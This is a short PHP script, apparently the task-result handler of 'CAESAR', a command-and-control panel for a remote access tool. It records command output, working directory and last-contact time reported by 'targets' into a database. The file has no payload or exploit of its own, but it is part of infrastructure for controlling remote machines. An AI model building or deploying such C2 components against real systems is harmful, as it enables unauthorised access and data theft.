<?php

	/*
		CAESAR

		Author : Michele '0blio' Cisternino
		Email  : miki.cisternino@gmail.com
		Github : https://github.com/0blio
	
		This project is released under the GPL 3 license. 	
	*/

	include '../database/connection.php';

	if ($_SERVER['REQUEST_METHOD'] == 'POST') {
		if (isset ($_POST['unique_id'], $_POST['command'], $_POST['task_id'], $_POST['output'], $_POST['wd'])) {

			$unique_id = $_POST['unique_id'];
			$command = urldecode($_POST['command']);
			$task_id = $_POST['task_id'];
			$output = urldecode($_POST['output']);
			$working_directory = urldecode($_POST['wd']);
			$datetime = date("Y-m-d H:i:s");		
			
			// Taking the target ID (Replace this code with joins)
			$id = $db -> table ('targets') -> columns ('id') -> eq ('unique_id', $unique_id) -> findAll();
			$id = $id[0]['id'];

			// Updating working directory and last request
			$db -> table ('targets') -> eq('id', $id) -> update (['working_directory' => $working_directory, 'last_request' => $datetime]);

			$updated = $db->table('tasks') -> eq('user_id', $id) -> eq ('task_id', $task_id) -> update(['time_run' => $datetime, 'output' => $output, 'executed' => 1]);
		}
	}
